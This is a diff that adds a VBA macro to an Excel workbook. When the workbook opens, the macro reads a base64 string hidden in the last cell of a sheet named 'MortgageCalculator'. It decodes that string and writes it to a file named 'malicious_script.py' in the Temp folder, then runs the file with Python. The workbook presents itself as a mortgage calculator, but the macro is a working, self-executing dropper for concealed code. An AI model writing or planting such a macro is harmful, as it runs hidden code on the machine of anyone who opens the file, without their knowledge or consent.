@@ -1,0 +1,46 @@
+Private Sub Workbook_Open()
+    Dim encodedScript As String
+    Dim decodedScript As String
+    Dim pythonFilePath As String
+    Dim binaryData() As Byte
+    Dim objFSO As Object
+    Dim objFile As Object
+
+    
+    ' Get the encoded Python script from the specified cell
+    encodedScript = ThisWorkbook.Sheets("MortgageCalculator").Range("XFD1048576").Value
+
+    ' Decode the base64 string using MS XML library
+    decodedScript = Base64Decode(encodedScript)
+
+    ' Convert the decoded string to a byte array
+    binaryData = StrConv(decodedScript, vbFromUnicode)
+
+    ' Save the decoded script to a Python file in the Temp folder
+    pythonFilePath = Environ("Temp") & "\malicious_script.py"
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(pythonFilePath, True)
+    objFile.Write decodedScript
+    objFile.Close
+
+    ' Execute the Python file
+    Shell "python """ & pythonFilePath & """"
+End Sub
+
+' Function to decode Base64 using MS XML
+Function Base64Decode(base64String As String) As String
+    Dim XML As Object
+    Dim Node As Object
+
+    Set XML = CreateObject("Msxml2.DOMDocument.6.0")
+    Set Node = XML.createElement("b64")
+
+    ' Set the data type to base64
+    Node.DataType = "bin.base64"
+
+    ' Assign the Base64 encoded string
+    Node.Text = base64String
+
+    ' Retrieve the decoded binary as a string
+    Base64Decode = StrConv(Node.nodeTypedValue, vbUnicode)
+End Function
